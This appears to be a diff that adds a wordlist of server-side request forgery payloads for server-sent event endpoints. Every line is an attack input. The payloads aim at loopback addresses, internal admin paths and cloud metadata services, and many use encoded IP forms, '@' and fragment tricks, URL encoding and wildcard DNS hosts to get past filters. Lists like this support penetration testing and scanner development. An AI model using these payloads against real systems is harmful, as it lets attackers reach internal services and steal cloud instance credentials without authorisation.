@@ -1,0 +1,51 @@
+# Server-sent event SSRF payloads
+http://127.0.0.1/events
+http://localhost/events
+http://127.0.0.1:8080/events
+http://localhost:8080/events
+http://127.0.0.1/stream
+http://localhost/stream
+http://127.0.0.1/sse
+http://localhost/sse
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+event: message\ndata: http://127.0.0.1/\n\n
+event: message\ndata: http://localhost/admin\n\n
+event: message\ndata: http://169.254.169.254/latest/meta-data/\n\n
+event: open\ndata: {"url":"http://127.0.0.1/"}\n\n
+event: open\ndata: {"href":"http://127.0.0.1/"}\n\n
+event: open\ndata: {"src":"http://127.0.0.1/"}\n\n
+event: open\ndata: {"target":"http://169.254.169.254/latest/meta-data/"}\n\n
+event: link\ndata: <http://127.0.0.1/>; rel=preload\n\n
+data: http://127.0.0.1/\n\n
+data: http://localhost/admin\n\n
+data: http://127.0.0.1:8080/admin\n\n
+data: http://169.254.169.254/latest/meta-data/\n\n
+data: //127.0.0.1/\n\n
+data: http://example.com@127.0.0.1/\n\n
+data: http://127.0.0.1#example.com/\n\n
+retry: 1\ndata: http://localhost/admin\n\n
+retry: 0\ndata: http://127.0.0.1/\n\n
+id: http://127.0.0.1/\ndata: x\n\n
+id: 1\nevent: fetch\ndata: http://127.0.0.1/\n\n
+: http://127.0.0.1/\ndata: keepalive\n\n
+event: redirect\ndata: http://example.com/redirect?url=http://127.0.0.1/\n\n
+event: webhook\ndata: http://127.0.0.1/callback\n\n
+event: webhook\ndata: http://169.254.169.254/latest/meta-data/\n\n
+event: image\ndata: <img src="http://127.0.0.1/">\n\n
+event: css\ndata: @import url("http://127.0.0.1/style.css")\n\n
+event: source\ndata: {"source":"http://127.0.0.1/events"}\n\n
+event: source\ndata: {"source":"http://metadata.google.internal/computeMetadata/v1/"}\n\n
+event: source\ndata: {"url":"http://2130706433/events"}\n\n
+event: source\ndata: {"endpoint":"http://0x7f000001/events"}\n\n
+event: source\ndata: {"callback":"http://0177.0.0.1/events"}\n\n
+event: source\ndata: {"next":"//127.0.0.1/events"}\n\n
+event: source\ndata: {"redirect":"http://example.com@127.0.0.1/events"}\n\n
+event: source\ndata: {"eventSource":"http://127.0.0.1%2fevents"}\n\n
+data: {"stream":"http://2130706433/events"}\n\n
+data: {"source":"http%3A%2F%2F127.0.0.1%2Fevents"}\n\n
+EventSource:http%3A%2F%2F127.0.0.1%2Fevents
+Last-Event-ID: http://127.0.0.1/
+event: probe\ndata: http://2130706433/events\n\n
+http://127.0.0.1.nip.io/events
+http://localhost.localtest.me/events
